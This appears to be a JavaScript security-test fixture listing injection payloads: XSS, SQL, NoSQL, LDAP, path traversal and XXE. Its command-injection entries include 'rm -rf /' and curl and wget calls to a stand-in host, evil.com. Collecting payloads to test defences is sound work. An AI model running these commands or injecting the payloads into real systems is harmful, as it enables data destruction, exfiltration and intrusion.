export const SecurityTestData = {
  xssPayloads: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<object data="javascript:alert(\'XSS\')"></object>',
    '<embed src="javascript:alert(\'XSS\')"></embed>'
  ],
  sqlInjections: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' OR 1=1 --",
    "'; UPDATE users SET password='hacked' WHERE id=1; --"
  ],
  nosqlInjections: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$where": "this.password == this.username"}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$nin": []}'
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd'
  ],
  commandInjection: [
    '; ls -la',
    '| whoami',
    '&& cat /etc/passwd',
    '`id`',
    '$(whoami)',
    '; rm -rf /',
    '| curl http://evil.com/steal',
    '&& wget http://evil.com/malware'
  ],
  ldapInjections: [
    '*',
    '*)(&',
    '*)(|(&',
    '*)(|(password=*',
    '*)(|(objectClass=*',
    '*)(|(uid=*',
    '*)(|(cn=*'
  ],
  xmlInjections: [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>'
  ],
  csrfTokens: [
    'invalid-token',
    'expired-token',
    'malformed-token',
    'reused-token',
    'null-token',
    'empty-token'
  ],
  sessionHijacking: [
    'sessionid=stolen-session-id',
    'PHPSESSID=hijacked-session',
    'JSESSIONID=compromised-session',
    'ASP.NET_SessionId=stolen-session'
  ]
};
